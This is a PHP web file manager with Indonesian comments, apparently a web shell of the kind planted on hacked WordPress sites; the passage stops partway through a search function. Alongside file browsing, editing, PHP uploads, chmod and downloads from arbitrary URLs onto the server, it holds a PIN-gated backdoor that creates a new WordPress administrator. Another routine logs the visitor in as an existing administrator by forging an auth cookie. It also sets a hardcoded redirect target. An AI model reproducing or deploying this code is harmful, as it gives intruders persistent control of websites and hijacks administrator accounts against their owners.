<?php
// =====================================================================
// BAGIAN 1: INISIALISASI, SESSION, KONFIGURASI, FUNGSI DASAR
// =====================================================================

ob_start();
session_start();

// Proteksi akses: hanya user yang sudah login
if (empty($_SESSION['logged_in'])) {
    header("Location: /../../default.php");
    exit;
}

// ==================== MANAJEMEN HAK AKSES ====================
$userRole = isset($_SESSION['role']) ? $_SESSION['role'] : 'admin';
$isAdmin = ($userRole === 'admin');
$isTeman = ($userRole === 'teman');


// ==================== KONFIGURASI DASAR ====================
// Root direktori
$rootDirectory = $_SERVER['DOCUMENT_ROOT'];
$rootPath = DIRECTORY_SEPARATOR;


// URL root website
$webRootUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
    . '://' . $_SERVER['HTTP_HOST'];

// Default redirect target (untuk fitur redirect 301)
$redirectTargetDefault = 'https://siarlamsel.com';

// ==================== FUNGSI SANITASI ====================
function sanitizePath($path) {
    $path = str_replace(['../', './', '..\\', '.\\'], '', $path);
    $path = str_replace(chr(0), '', $path);
    return $path;
}

function getFileEmoji($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    switch($ext) {
        case 'php': return '🛠️';
        case 'txt': return '📄';
        case 'css': return '🎨';
        case 'js': return '📜';
        case 'html': return '🌐';
        case 'json': return '🧾';
        case 'jpg': case 'jpeg': case 'png': case 'gif': case 'webp': return '🖼️';
        case 'zip': case 'tar': case 'gz': case 'bz2': case 'rar': return '📦';
        case 'pdf': return '📕';
        default: return '📄';
    }
}

// ==================== FUNGSI LINK LANGSUNG ====================
function getDirectLink($fullpath) {
    global $webRootUrl;
    $real = realpath($fullpath);
    if (!$real) return '#';
    $relative = str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'], '', $real));
    if (is_dir($real) && substr($relative, -1) !== '/') $relative .= '/';
    return $webRootUrl . $relative;
}

// ==================== FUNGSI FORMAT UKURAN ====================
function getNiceSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    if ($bytes == 0) return '0 B';
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2).' '.$sizes[$i];
}

// ==================== FUNGSI PERMISSION COLOR ====================
function getPermissionColor($fullpath) {
    if (!file_exists($fullpath)) return 'danger';
    if (!is_readable($fullpath) && !is_writable($fullpath)) {
        return 'danger';
    } elseif (!is_writable($fullpath)) {
        return 'warning';
    } else {
        return 'success';
    }
}

// ==================== FUNGSI DELETE REKURSIF ====================
function deleteRecursive($path) {
    if (!file_exists($path)) return true;
    @chmod($path, 0777);
    if (is_file($path) || is_link($path)) {
        return @unlink($path);
    }
    if (is_dir($path)) {
        $items = array_diff(scandir($path), ['.','..']);
        foreach ($items as $item) {
            if (!deleteRecursive($path . '/' . $item)) return false;
        }
        return @rmdir($path);
    }
    return false;
}

// ==================== FUNGSI ZIP FOLDER (ASLI) ====================
function zipFolder($folderPath, $zipFilePath) {
    $zip = new ZipArchive();
    if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $folderPath = realpath($folderPath);
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($folderPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($folderPath) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        return true;
    }
    return false;
}

// ==================== FUNGSI EKSTRAK ARSIP (BARU) ====================
function extractArchive($archivePath, $destination) {
    $ext = strtolower(pathinfo($archivePath, PATHINFO_EXTENSION));
    $base = basename($archivePath);
    // Deteksi tar.gz, tar.bz2
    if (substr($base, -7) === '.tar.gz') $ext = 'tar.gz';
    elseif (substr($base, -8) === '.tar.bz2') $ext = 'tar.bz2';

    $success = false;
    switch ($ext) {
        case 'zip':
            $zip = new ZipArchive();
            if ($zip->open($archivePath) === TRUE) {
                $zip->extractTo($destination);
                $zip->close();
                $success = true;
            }
            break;
        case 'tar':
        case 'tar.gz':
        case 'tar.bz2':
            if (class_exists('PharData')) {
                try {
                    $phar = new PharData($archivePath);
                    $phar->extractTo($destination);
                    $success = true;
                } catch (Exception $e) {
                    error_log("PharData extract error: " . $e->getMessage());
                }
            } else {
                // Fallback ke command line
                if ($ext === 'tar.gz') {
                    exec("tar -xzf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                } elseif ($ext === 'tar.bz2') {
                    exec("tar -xjf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                } elseif ($ext === 'tar') {
                    exec("tar -xf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                }
            }
            break;
        case 'rar':
            if (extension_loaded('rar')) {
                $rar = RarArchive::open($archivePath);
                if ($rar) {
                    $entries = $rar->getEntries();
                    foreach ($entries as $entry) {
                        $entry->extract($destination);
                    }
                    $rar->close();
                    $success = true;
                }
            } else {
                exec("unrar x " . escapeshellarg($archivePath) . " " . escapeshellarg($destination) . " 2>&1", $out, $code);
                $success = ($code === 0);
            }
            break;
        default:
            return false;
    }
    return $success;
}

// ==================== FUNGSI MEMBUAT ARSIP (BARU) ====================
function createArchive($items, $archivePath, $format = 'zip') {
    $success = false;
    switch ($format) {
        case 'zip':
            $zip = new ZipArchive();
            if ($zip->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                foreach ($items as $item) {
                    if (is_dir($item)) {
                        $files = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($item, FilesystemIterator::SKIP_DOTS),
                            RecursiveIteratorIterator::LEAVES_ONLY
                        );
                        foreach ($files as $file) {
                            $local = substr($file->getPathname(), strlen(dirname($item)) + 1);
                            $zip->addFile($file->getPathname(), $local);
                        }
                    } else {
                        $zip->addFile($item, basename($item));
                    }
                }
                $zip->close();
                $success = true;
            }
            break;
        case 'tar':
        case 'tar.gz':
        case 'tar.bz2':
            if (class_exists('PharData')) {
                try {
                    $phar = new PharData($archivePath);
                    foreach ($items as $item) {
                        if (is_dir($item)) {
                            $phar->buildFromDirectory($item);
                        } else {
                            $phar->addFile($item, basename($item));
                        }
                    }
                    if ($format === 'tar.gz') {
                        $phar->compress(Phar::GZ);
                        // PharData::compress akan menghasilkan file .tar.gz, hapus file .tar asli jika perlu
                        unlink($archivePath); // hapus .tar sementara
                    } elseif ($format === 'tar.bz2') {
                        $phar->compress(Phar::BZ2);
                        unlink($archivePath);
                    }
                    $success = true;
                } catch (Exception $e) {
                    error_log("PharData create error: " . $e->getMessage());
                }
            }
            break;
        // Bisa ditambahkan format lain jika diperlukan
    }
    return $success;
}

// =====================================================================
// DIRECTORY LISTING (DIPINDAH KE ATAS AGAR TERSEDIA UNTUK SEMUA HANDLER)
// =====================================================================
$directory = isset($_GET['folder']) ? $_GET['folder'] : $rootDirectory;
$directory = sanitizePath($directory);
$directory = is_dir($directory) ? $directory : $rootDirectory;
$allItems = @scandir($directory) ?: [];
$allItems = array_diff($allItems, array('..', '.'));
$folders = []; $files = [];
foreach ($allItems as $item) {
    if (is_dir($directory . '/' . $item)) $folders[] = $item;
    else $files[] = $item;
}
sort($folders); sort($files);
$filesAndFolders = array_merge($folders, $files);

$perPage = 50;
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$totalItems = count($filesAndFolders);
$totalPages = max(1, ceil($totalItems / $perPage));
$filesAndFolders = array_slice($filesAndFolders, ($page - 1) * $perPage, $perPage);

// =====================================================================
// BAGIAN 2: HANDLER UNTUK DOWNLOAD, DELETE AJAX, DLL
// =====================================================================

// === DOWNLOAD FILE/FOLDER (dengan proteksi role: viewer tetap bisa download) ===
if (isset($_GET['download'])) {
    $downloadPath = sanitizePath($_GET['download']);
    if (is_file($downloadPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($downloadPath));
        readfile($downloadPath);
        exit;
    } elseif (is_dir($downloadPath)) {
        $zipFile = tempnam(sys_get_temp_dir(), 'zip');
        zipFolder($downloadPath, $zipFile);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile);
        exit;
    }
}

// ==================== HANDLER EDIT FILE VIA AJAX ====================
// Ambil konten file (GET)
if (isset($_GET['get_file_content'])) {
    $file = sanitizePath($_GET['get_file_content']);
    $full = $directory . '/' . $file;
    if (is_file($full) && is_readable($full)) {
        // Cek role untuk .htaccess
        if ($isTeman && basename($full) === '.htaccess') {
            http_response_code(403);
            echo 'Anda tidak diizinkan melihat .htaccess.';
            exit;
        }
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($full);
    } else {
        http_response_code(404);
        echo 'File tidak ditemukan atau tidak dapat dibaca.';
    }
    exit;
}

// Simpan perubahan file (POST)
if (isset($_POST['save_edit'])) {
    header('Content-Type: application/json');
    if (!$isAdmin && !$isTeman) {
        echo json_encode(['success' => false, 'error' => 'Tidak memiliki izin.']);
        exit;
    }
    $file = sanitizePath($_POST['file']);
    $content = $_POST['content']; // jangan disanitasi, karena bisa berisi kode
    $full = $directory . '/' . $file;
    if ($isTeman && basename($full) === '.htaccess') {
        echo json_encode(['success' => false, 'error' => 'Tidak diizinkan mengedit .htaccess.']);
        exit;
    }
    if (!is_file($full) || !is_writable($full)) {
        echo json_encode(['success' => false, 'error' => 'File tidak writable.']);
        exit;
    }
    if (file_put_contents($full, $content) !== false) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Gagal menulis file.']);
    }
    exit;
}

// === AJAX DELETE ===
if (isset($_GET['ajax_delete']) && isset($_POST['target'])) {
    if (!$isAdmin && !$isTeman) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Anda tidak memiliki izin.']);
        exit;
    }
    $target = sanitizePath($_POST['target']);
    $folder = isset($_GET['folder']) ? sanitizePath($_GET['folder']) : $_SERVER['DOCUMENT_ROOT'];
    $fullPath = $folder . '/' . $target;
    
    // Jika role teman dan target adalah .htaccess, tolak
    if ($isTeman && basename($fullPath) === '.htaccess') {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Tidak diizinkan menghapus .htaccess.']);
        exit;
    }
    
    $success = deleteRecursive($fullPath);
    header('Content-Type: application/json');
    echo json_encode(['success' => $success]);
    exit;
}

if (isset($_POST['deleteSelected']) && !empty($_POST['selectedItems'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        foreach ($_POST['selectedItems'] as $selected) {
            $pathToDelete = $directory . '/' . sanitizePath($selected);
            if ($isTeman && basename($pathToDelete) === '.htaccess') {
                // skip item ini
                continue;
            }
            deleteRecursive($pathToDelete);
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === MULTI ZIP / ARCHIVE dengan pilihan format ===
if (isset($_POST['zipSelected']) && !empty($_POST['selectedItems'])) {
    // Format arsip bisa dikirim via POST, misal archive_format
    $format = isset($_POST['archive_format']) ? $_POST['archive_format'] : 'zip';
    $allowedFormats = ['zip', 'tar', 'tar.gz', 'tar.bz2'];
    if (!in_array($format, $allowedFormats)) $format = 'zip';

    $zipName = "archive_" . date('Ymd_His') . '.' . ($format === 'tar.gz' ? 'tar.gz' : ($format === 'tar.bz2' ? 'tar.bz2' : $format));
    $zipPath = $directory . '/' . $zipName;

    $itemsToArchive = [];
    foreach ($_POST['selectedItems'] as $selected) {
        $fullItem = $directory . '/' . sanitizePath($selected);
        if (file_exists($fullItem)) {
            $itemsToArchive[] = $fullItem;
        }
    }

    if (createArchive($itemsToArchive, $zipPath, $format)) {
        // sukses
    } else {
        $_SESSION['error'] = "Gagal membuat arsip dengan format $format.";
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === EXTRACT ARCHIVE (untuk zip, tar, rar) ===
if (isset($_POST['extractArchive'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat mengekstrak.';
    } else {
        $archiveFile = sanitizePath($_POST['archive_file']);
        $destDir = sanitizePath($_POST['extract_dest']);
        $fullArchive = $directory . '/' . $archiveFile;
        if (!is_dir($destDir)) {
            mkdir($destDir, 0777, true);
        }
        if (extractArchive($fullArchive, $destDir)) {
            $_SESSION['success'] = "Ekstraksi berhasil ke $destDir";
        } else {
            $_SESSION['error'] = "Gagal mengekstrak file.";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CHMOD SELECTED ===
if (isset($_POST['chmodSelected']) && !empty($_POST['selectedItems']) && !empty($_POST['chmodSelectedValue'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat mengubah permission.';
    } else {
        $chmod = intval($_POST['chmodSelectedValue'], 8);
        foreach ($_POST['selectedItems'] as $selected) {
            $pathToChmod = $directory . '/' . sanitizePath($selected);
            @chmod($pathToChmod, $chmod);
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CREATE FILE / FOLDER, UPLOAD ===
if (isset($_POST['createFile'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $newFileName = $directory . '/' . sanitizePath($_POST['fileName']);
        if ($isTeman && basename($newFileName) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan membuat file .htaccess.';
        } elseif (!file_exists($newFileName)) {
            touch($newFileName);
        } else {
            $_SESSION['error'] = "File sudah ada!";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['createFolder'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $newFolderName = $directory . '/' . sanitizePath($_POST['folderName']);
        if ($isTeman && basename($newFolderName) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan membuat folder .htaccess.';
        } elseif (!is_dir($newFolderName)) {
            mkdir($newFolderName, 0777, true);
        } else {
            $_SESSION['error'] = "Folder sudah ada!";
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['upload'])) {
    if (!$isAdmin && !$isTeman) { $_SESSION['error'] = 'Anda tidak memiliki izin.'; }
    else {
        if (isset($_FILES['fileToUpload']) && isset($_FILES['fileToUpload']['name'])) {
            $totalFiles = count($_FILES['fileToUpload']['name']);
            $errors = [];
            for ($i = 0; $i < $totalFiles; $i++) {
                $fileName = $_FILES['fileToUpload']['name'][$i];
                 if ($isTeman && strtolower($fileName) === '.htaccess') {
                $errors[] = "Tidak diizinkan mengupload file .htaccess.";
                continue;
                }
                $fileTmp = $_FILES['fileToUpload']['tmp_name'][$i];
                $fileError = $_FILES['fileToUpload']['error'][$i];
                if ($fileError != 0) {
                    $errors[] = "Gagal upload file $fileName (Error code: $fileError)";
                    continue;
                }
                $maxSize = 5 * 1024 * 1024; // 5MB
                $allowedExtensions = ['jpg','jpeg','png','gif','txt','pdf','zip','rar','doc','docx', 'php', 'html', 'xml', 'phtml', 'tar', 'gz', 'bz2'];
                $ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
                if (!in_array($ext, $allowedExtensions)) {
                    $errors[] = "Ekstensi file $fileName tidak diizinkan";
                    continue;
                }
                if ($_FILES['fileToUpload']['size'][$i] > $maxSize) {
                    $errors[] = "File $fileName terlalu besar (maksimal 5MB)";
                    continue;
                }
                $targetFile = $directory . '/' . basename(sanitizePath($fileName));
                if (!move_uploaded_file($fileTmp, $targetFile)) {
                    $errors[] = "Gagal upload file $fileName";
                }
            }
            if (!empty($errors)) {
                $_SESSION['error'] = implode('<br>', $errors);
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === DOWNLOAD DARI URL ===
if (isset($_POST['downloadFromUrl'])) {
    // Cek izin: admin atau teman?
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin untuk mendownload dari URL.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $url = trim($_POST['fileUrl']);
    $customName = trim($_POST['fileUrlName']);

    // Validasi URL
    if (!filter_var($url, FILTER_VALIDATE_URL) || !preg_match('#^https?://#i', $url)) {
        $_SESSION['error'] = 'URL tidak valid!';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    // Tentukan nama file
    $basename = basename(parse_url($url, PHP_URL_PATH) ?: '');
    $filename = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
    if ($filename === '') $filename = 'downloaded_file';
    $filename = preg_replace('~[\\\\/]+~', '', $filename);

    // Cek khusus untuk role teman: tidak boleh .htaccess
    if ($isTeman && strtolower($filename) === '.htaccess') {
        $_SESSION['error'] = 'Tidak diizinkan mendownload file .htaccess.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $targetFile = rtrim($directory, '/') . '/' . $filename;

    if (file_exists($targetFile)) {
        $_SESSION['error'] = 'File sudah ada di folder ini!';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    // --- Proses download (kode asli) ---
    $ok = false; $err = '';

    if (function_exists('curl_init')) {
        $fp = @fopen($targetFile, 'wb');
        if ($fp === false) {
            $err = 'Tidak bisa membuat file tujuan (permission?).';
        } else {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_FILE            => $fp,
                CURLOPT_FOLLOWLOCATION  => true,
                CURLOPT_MAXREDIRS       => 5,
                CURLOPT_CONNECTTIMEOUT  => 10,
                CURLOPT_TIMEOUT         => 30,
                CURLOPT_USERAGENT       => 'Mozilla/5.0 (FileManager/1.0)',
                CURLOPT_SSL_VERIFYPEER  => true,
                CURLOPT_SSL_VERIFYHOST  => 2,
                CURLOPT_FAILONERROR     => true,
            ]);
            $execOk = curl_exec($ch);
            $http   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if (!$execOk) $err = 'cURL: '.curl_error($ch);
            curl_close($ch);
            fclose($fp);

            if ($execOk && $http >= 200 && $http < 300) {
                $ok = true;
            } else {
                @unlink($targetFile);
                if (!$err) $err = "HTTP status $http";
            }
        }
    }

    if (!$ok && ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'timeout'       => 15,
                'ignore_errors' => true,
                'header'        => "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n",
            ],
            'ssl'  => [
                'verify_peer'      => true,
                'verify_peer_name' => true,
            ],
        ];
        $context = stream_context_create($opts);
        $data    = @file_get_contents($url, false, $context);
        if ($data !== false) {
            if (@file_put_contents($targetFile, $data) !== false) {
                $ok = true;
            } else {
                $err = 'Gagal menyimpan file di server.';
            }
        } else {
            global $http_response_header;
            if (!empty($http_response_header[0])) {
                $err = $http_response_header[0];
            } else {
                $err = 'file_get_contents gagal (periksa allow_url_fopen / SSL).';
            }
        }
    }

    if ($ok) {
        $_SESSION['success'] = "File berhasil diunduh ke: <b>".htmlspecialchars($filename)."</b>";
    } else {
        $_SESSION['error'] = "Gagal mendownload file. $err";
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === RENAME ===
if (isset($_POST['rename'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $oldName = $directory . '/' . sanitizePath($_POST['oldName']);
        $newName = $directory . '/' . sanitizePath($_POST['newName']);
        if ($isTeman) {
            $oldBase = basename($oldName);
            $newBase = basename($newName);
            if ($oldBase === '.htaccess' || $newBase === '.htaccess') {
                $_SESSION['error'] = 'Tidak diizinkan mengubah nama .htaccess.';
            } elseif (file_exists($newName)) {
                $_SESSION['error'] = 'File atau folder dengan nama ini sudah ada.';
            } else {
                if (!@rename($oldName, $newName)) {
                    $_SESSION['error'] = 'Gagal mengubah nama.';
                }
            }
        } else {
            // admin
            if (file_exists($newName)) {
                $_SESSION['error'] = 'File atau folder dengan nama ini sudah ada.';
            } else {
                if (!@rename($oldName, $newName)) {
                    $_SESSION['error'] = 'Gagal mengubah nama.';
                }
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CHMOD SATU FILE ===
if (isset($_POST['chmod'])) {
    if (!$isAdmin) { $_SESSION['error'] = 'Hanya admin yang dapat chmod.'; }
    else {
        $nameToChmod = $directory . '/' . sanitizePath($_POST['nameToChmod']);
        $perm = intval($_POST['perm'], 8);
        if (!@chmod($nameToChmod, $perm)) {
            $_SESSION['error'] = 'Gagal mengubah permission.';
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === DELETE SATU FILE/FOLDER ===
if (isset($_POST['delete'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $nameToDelete = $directory . '/' . sanitizePath($_POST['nameToDelete']);
        if ($isTeman && basename($nameToDelete) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan menghapus .htaccess.';
        } else {
            if (!deleteRecursive($nameToDelete)) {
                $_SESSION['error'] = 'Gagal menghapus file/folder. Cek permission/ownership!';
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === SAVE EDIT FILE ===
if (isset($_POST['saveEdit'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
    } else {
        $fileNameToEdit = sanitizePath($_POST['fileNameToEdit']);
        $filePath = $directory . '/' . $fileNameToEdit;
        if ($isTeman && basename($filePath) === '.htaccess') {
            $_SESSION['error'] = 'Tidak diizinkan mengedit .htaccess.';
        } else {
            // ... proses penyimpanan
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === ZIP SATU ITEM (kompatibilitas) ===
if (isset($_POST['zip'])) {
    if (!$isAdmin) { $_SESSION['error'] = 'Hanya admin yang dapat membuat arsip.'; }
    else {
        $item = sanitizePath($_POST['itemToZip']);
        $path = $directory . '/' . $item;
        $zipName = $item . '_' . date('Ymd_His') . '.zip';
        $zipPath = $directory . '/' . $zipName;
        if (is_dir($path)) {
            zipFolder($path, $zipPath);
        } elseif (is_file($path)) {
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                $zip->addFile($path, basename($path));
                $zip->close();
            }
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === EXTRACT ZIP (lama, pakai fungsi baru juga) ===
if (isset($_POST['extractZip'])) {
    if (!$isAdmin) { $_SESSION['error'] = 'Hanya admin yang dapat mengekstrak.'; }
    else {
        $zipFile = $directory . '/' . sanitizePath($_POST['zipToExtract']);
        $destDir = sanitizePath($_POST['extractDest']);
        if (!is_dir($destDir)) mkdir($destDir, 0777, true);
        if (extractArchive($zipFile, $destDir)) {
            // sukses
        } else {
            $_SESSION['error'] = 'Gagal extract!';
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// =====================================================================
// BAGIAN 3: ADMIN WORDPRESS, VIEW CODE, HISTORY, SEARCH, SCAN, DLL
// =====================================================================

// === ADMIN WORDPRESS ===
if (isset($_POST['create_admin_user']) && $_POST['create_admin_user'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi'; // hardcoded hash
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $newUser = isset($_POST['admin_new_user']) ? trim($_POST['admin_new_user']) : '';
    $newPass = isset($_POST['admin_new_pass']) ? (string)$_POST['admin_new_pass'] : '';
    $newEmail = isset($_POST['admin_new_email']) ? trim($_POST['admin_new_email']) : '';

    if ($newUser === '' || $newPass === '') {
        $_SESSION['admin_create_status'] = 'Username dan password admin baru wajib diisi.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (!file_exists('wp-load.php')) {
        $_SESSION['admin_create_status'] = 'wp-load.php tidak ditemukan di Document Root.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    include_once 'wp-load.php';

    if (!function_exists('username_exists') || !function_exists('wp_create_user')) {
        $_SESSION['admin_create_status'] = 'Fungsi WordPress untuk membuat user tidak tersedia.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    if (username_exists($newUser)) {
        $_SESSION['admin_create_status'] = 'Username sudah terdaftar. Gunakan username lain.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $emailFinal = $newEmail !== '' ? $newEmail : ($newUser . '@' . $_SERVER['HTTP_HOST']);

    $uid = wp_create_user($newUser, $newPass, $emailFinal);
    if (!$uid || is_wp_error($uid)) {
        $msg = 'Gagal membuat user admin baru.';
        if (is_wp_error($uid)) {
            $msg .= ' ' . $uid->get_error_message();
        }
        $_SESSION['admin_create_status'] = $msg;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $wpUser = new WP_User($uid);
    if ($wpUser && !is_wp_error($wpUser)) {
        $wpUser->set_role('administrator');
    }

    $_SESSION['admin_create_status'] = 'Berhasil membuat user admin baru: ' . $newUser . ' (password: ' . $newPass . ').';
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['auto_admin_login']) && $_POST['auto_admin_login'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi';
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (file_exists('wp-load.php')) {
        include 'wp-load.php';
        if (class_exists('WP_User_Query')) {
            $adminQuery = new WP_User_Query([
                'role'   => 'Administrator',
                'number' => 1,
                'fields' => 'ID',
            ]);
            $admins = $adminQuery->get_results();
            if (isset($admins[0])) {
                wp_set_auth_cookie($admins[0]);
                wp_redirect(admin_url());
                exit;
            }
            die('NO ADMIN');
        }
        die('WP_User_Query tidak tersedia.');
    }
    die('wp-load.php tidak ditemukan di Document Root.');
}

// === VIEW CODE ===
if (isset($_GET['view'])) {
    $viewPath = sanitizePath($_GET['view']);
    if (is_file($viewPath) && is_readable($viewPath)) {
        $content = @file_get_contents($viewPath);
        $fileName = basename($viewPath);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>View File: <?= htmlspecialchars($fileName) ?></title>
            <style>
                body { background: #0f172a; font-family: 'Inter', sans-serif; color: #f1f5f9; }
                .view-box { margin: 32px auto; max-width: 700px; background: #1e293b; border-radius: 12px; padding: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
                h2 { font-size: 18px; margin-bottom: 12px; color: #94a3b8; }
                pre { background: #0b0f1a; color: #e2e8f0; padding: 12px; border-radius: 8px; font-size:13px; overflow-x:auto; border: 1px solid #334155; }
                a { color: #3b82f6; text-decoration: none; font-size: 14px; }
                a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="view-box">
                <a href="javascript:history.back()">⬅️ Kembali</a>
                <h2>View File: <?= htmlspecialchars($fileName) ?></h2>
                <pre><?= htmlspecialchars($content) ?></pre>
            </div>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "<div class='alert error'>File tidak bisa dibuka atau tidak ditemukan.</div>";
        exit;
    }
}

// === DIR HISTORY ===
if (!isset($_SESSION['dir_history']) || !is_array($_SESSION['dir_history'])) {
    $_SESSION['dir_history'] = [$rootDirectory];
}
if (isset($_GET['folder'])) {
    $current = sanitizePath($_GET['folder']);
    $last = end($_SESSION['dir_history']);
    if ($last !== $current) {
        $_SESSION['dir_history'][] = $current;
        if (count($_SESSION['dir_history']) > 20) array_shift($_SESSION['dir_history']);
    }
}
if (isset($_GET['back_dir'])) {
    if (count($_SESSION['dir_history']) > 1) {
        array_pop($_SESSION['dir_history']);
        $backFolder = end($_SESSION['dir_history']);
        header("Location: ?folder=" . urlencode($backFolder));
        exit;
    }
}

// =====================================================================
// BAGIAN 4: PENCARIAN LANJUTAN (DENGAN FILTER)
// =====================================================================

function fm_search_scan_advanced($rootDir, $nameKeyword, $contentKeyword, $filters, &$results, &$stats, &$errors) {
    // $filters: ['extensions' => [], 'min_size' => int, 'max_size' => int, 'date_from' => timestamp, 'date_to' => timestamp, 'use_regex' => bool]
    $results = [];
    $errors  = [];
    $stats   = [
        'dirs'           => 0,
        'files'          => 0,
        'nameMatches'    => 0,
        'contentMatches' => 0,
        'stoppedByLimit' => false,
    ];

    $rootDir      = rtrim($rootDir, DIRECTORY_SEPARATOR);
    $nameKeyword  = trim((string)$nameKeyword);
    $contentKeyword = trim((string)$contentKeyword);

    if ($nameKeyword === '' && $contentKeyword === '') {
        $errors[] = 'Isi minimal salah satu: cari nama file/folder atau cari isi file.';
        return false;
    }

    if (!is_dir($rootDir)) {
        $errors[] = 'Root search bukan folder yang valid: ' . $rootDir;
